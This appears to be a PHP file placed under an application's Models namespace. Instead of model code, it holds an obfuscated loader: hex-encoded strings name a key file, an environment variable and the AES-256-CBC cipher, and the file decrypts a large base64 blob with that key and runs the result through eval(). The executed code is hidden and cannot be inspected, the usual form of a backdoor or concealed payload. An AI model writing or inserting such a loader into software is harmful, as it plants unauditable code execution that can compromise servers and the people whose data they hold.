<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('iAR8LO3LH0bmFjt1mNdCmA==');

$c=base64_decode(

'Rlj7uTe/8YC7BjL07R7TVlAZV4SZVUNVss0vS6uIYm0n7zR4hsT+e6NHjlCGbbVJscgdoGhAE0CU' .
'WWA2yXMp8GV2sIuHHD7WuH+W4kGxgH6UnkTlvPBhgODuBQJjG6c48NAke1Sh8hkDit1F1moWWyyv' .
'75gtuMreziu56GLIc0Qt++bO/RQwpMOih6v8RLCEEbKS0/GRZfoX9+0CHiVMbYVLh839QvIaKAl1' .
'0YKNJSAkwdAtLT3TZwduStpR8lHV1Ye60V1xTVsdx5Dodpaa2VNs89INtGTIv557KGG2wfW+xAwJ' .
'aROZgkJPq+p6ZpZeO08z/J730STtKyk9O9QcspUy3ShF6YOkmZhN6jNcRchDR8g02yPRIbLdnu2U' .
'hjfkp1pCrmFTFb2O/r7T1WxUn/tKei2fMCQO+BlRS2NzaaFCpUUbXD1YoHMJNJiFoF4hkskn1xcT' .
'RUY6zw/QE978c3ufJryILTc5Zy1wYpb8iJKW50vbH2eL2JOPQnWN+iZZrIx7iS3b0lepWrnk13fz' .
'I8C55zNLGw0jlQfINnZOFVR2ERFhnY3ZpWed52PlQh6kZO567uVONtvl8dj6C7nEWaxpDhNp5BSR' .
'HRofzfwGKrX8PZrOkwriJx/CB2dirSr3FVPzjFx18amAfnpAjewybKgTgsoFNn6jhs8GjS4nUrSV' .
'Fhjf/ZbVIh2N9jxvoRNDfn0dZGe74iszpTS+4VQds8low3TDskzvxXxwHNlZABBsouDpFPhyjrdE' .
'3abI3KEj631t/wcUmq7rs+5wqivxZjAF0iFCa/lwux6BEWijAx+oko55JH0jfZ5fdv7IArtRa9w/' .
'y2JyVhP7ta0vY0ew88aBdrvxS1ZG9FDogUsrwFkhpJ6EzZR2COFyoeK8c9Hg2UnPsWZsXXFak1DX' .
'TV17cD5uszQCfJkzpYOVB2waPuANLo4VgHwnet5V7tzgJqkYZdgvQnntyVEfTOjn/RQzP47NPMg6' .
'mUOnxuGolm/KOW00V+YwZIFsanI4gLd83qHxxqG06Pgkoh9rkBSEBSE3aWuPrZZRqVbYP70PN9oN' .
'T2VOKLj+vGINTrgAK3TJ5CkOXWI1zpFuGprFB9xlKeshWxKEPr4IK88s/S6VP/iTMih6UZ3Cm5Zx' .
'UBWDxvA0vbeIQwK3tSIL37yXVqdo21yFRraT83/i3bocYJHksEFTbBjsEbcZ5CqY2n3EGe8GQbrT' .
'wu4RqWdxKyXl/UmAUqVxmGipzm9gRTdyEhlg0YNOE2GMWa28ts9Xn2kssfUmeAQlxQ2UbQMo/xey' .
'AMcLUa8CE7heh0l48Wc/hYAsex8w6wrOxOc1YkyOEFOgQoHKstEFPpj05aFzTz1ZEVJpmSpcLbL/' .
'2ZKJS0SG5R8rYHaHW8QCSkGOZO8T1682Z1KRBXVCiqrW/SBDW/1ZpRow9ZX4JJNhhQFZfbEka/MX' .
'GistZ1mUWrzklD//UPSJaez2+Mw8v4cmlfGLHqrJyRW4M0R+hYybY4ywXwT2KykUdhF8fEbC9Pu0' .
'c4zXGCAVdcX+G3DIFj6w5WqI/JL2PnJ+iio5o/GpgQr8pqKqNDvlChMTSaEGradVoHXbk7Bmy9Jc' .
'MjjBSEvHwEirOGc2QYJnndax/3nWW/kbR/juDwrYt1b2wkiM5AkV9bgeeRTwR2tSJMRt8K+1vYYA' .
'8mTGT41t3Dd2ul17K7P3QfyHHVURRGCbxRsuUxr4SpesaF/SKUfOwFeXYh3tERywp8zTmurAae8n' .
'F8pQJm15lsv7OheO62tWpEhbBaUI+tW6JJmnubAMSOuLxL+naXz7gZEsBC2fCyfoB6CP+9cp4MC0' .
'QZ/sNLYHsNWNQql0egqYFwGQPWDdPlR3u5zxtZ0xWnlPRSZ2oI46tJEhKEC0aag6ud5sLYc5qDa8' .
'bXpvFs8Z5PeeI/x9PJEAyujnehohShHfgfKKE9ncrNNQi2s193nt/xhCtDhOZbEL4JcKBD3vPPmS' .
'0eQzp2lLjDE89GPPbkYszlLlOmgu5dI1huGtA2lZS27WSHU/x4em9T7Yr1YMwszEmNb6wpb8FZUf' .
'g08cMx71UaCwr5nn9bLmGIgyJVuFPc9JENDm2tj10hLcOCypH+h9WbFjf/QyZSu5wO9Rjmn25D1w' .
'PMDBLA=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

